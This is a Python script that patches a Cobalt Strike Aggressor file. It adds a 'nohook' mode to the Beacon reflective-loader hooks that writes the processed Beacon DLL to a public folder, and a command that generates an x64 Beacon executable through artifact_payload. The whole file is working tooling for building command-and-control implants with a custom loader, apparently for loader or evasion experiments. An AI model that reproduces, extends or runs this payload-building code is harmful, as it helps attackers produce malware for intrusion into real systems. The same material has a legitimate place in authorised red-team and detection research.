# -*- coding: utf-8 -*-
r"""patch_nohook.py - $g_nohook mode: SIZE returns 5 (stock), GENERATE writes
$2 (peProcessedDLL - stock-processed, settings+MZAR+RL) to probe_baked and
returns null, so the own-exe wrap carries the stock-processed official DLL."""
import io

P = (r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts"
     r"\p3-llvm-bench\tsboot_run\headless_franken.cna")
s = io.open(P, encoding="utf-8").read()

L = chr(10)
TAB = chr(9)
B4 = chr(92) * 4

# 1. flag next to $g_obtrace
i = s.find("$g_obtrace = 0;")
assert i > 0
j = s.find(L, i)
s = s[:i] + s[i:j] + L + "$g_nohook = 0;   # C-49: stock pipeline (SIZE=5, GENERATE passthrough)" + s[j:]
print("flag added")

# 2. SIZE hook early return
size_anchor = 'set BEACON_RDLL_SIZE {' + L
assert size_anchor in s
s = s.replace(size_anchor, size_anchor +
    TAB + 'if ($g_nohook == 1) { return "5"; }' + L, 1)

# 3. GENERATE hook early return (before the beacon branch)
gen_anchor = 'set BEACON_RDLL_GENERATE {' + L
assert gen_anchor in s
s = s.replace(gen_anchor, gen_anchor +
    TAB + 'if ($g_nohook == 1) {' + L +
    TAB + TAB + 'writeb(openf(">C:' + B4 + 'Users' + B4 + 'Public' + B4 +
    'probe_baked.bin"), $2);' + L +
    TAB + TAB + 'println("[UDRL-NOHOOK] passthrough peProcessedDLL " . strlen($2) . "B");' + L +
    TAB + TAB + 'return $null;' + L +
    TAB + '}' + L, 1)
print("hook branches added")

# 4. nohook_exe command
cmd = (
    TAB + 'else if ($cmd eq "nohook_exe") {' + L +
    TAB + TAB + '$g_nohook = 1;' + L +
    TAB + TAB + '$null = artifact_payload($a1, "exe", "x64");' + L +
    TAB + TAB + '$g_nohook = 0;' + L +
    TAB + TAB + 'blog($bid, "nohook: exe generated");' + L +
    TAB + TAB + 'return;' + L +
    TAB + '}' + L
)
cmd_open = TAB + 'else if ($cmd eq "obtrace_exe") {' + L
ci = s.find(cmd_open)
assert ci > 0
cm = L + TAB + '}' + L
cj = s.find(cm, ci) + len(cm)
s = s[:cj] + cmd + s[cj:]
print("nohook_exe command added")

io.open(P, "w", encoding="utf-8", newline="").write(s)
print("done - no BOM")
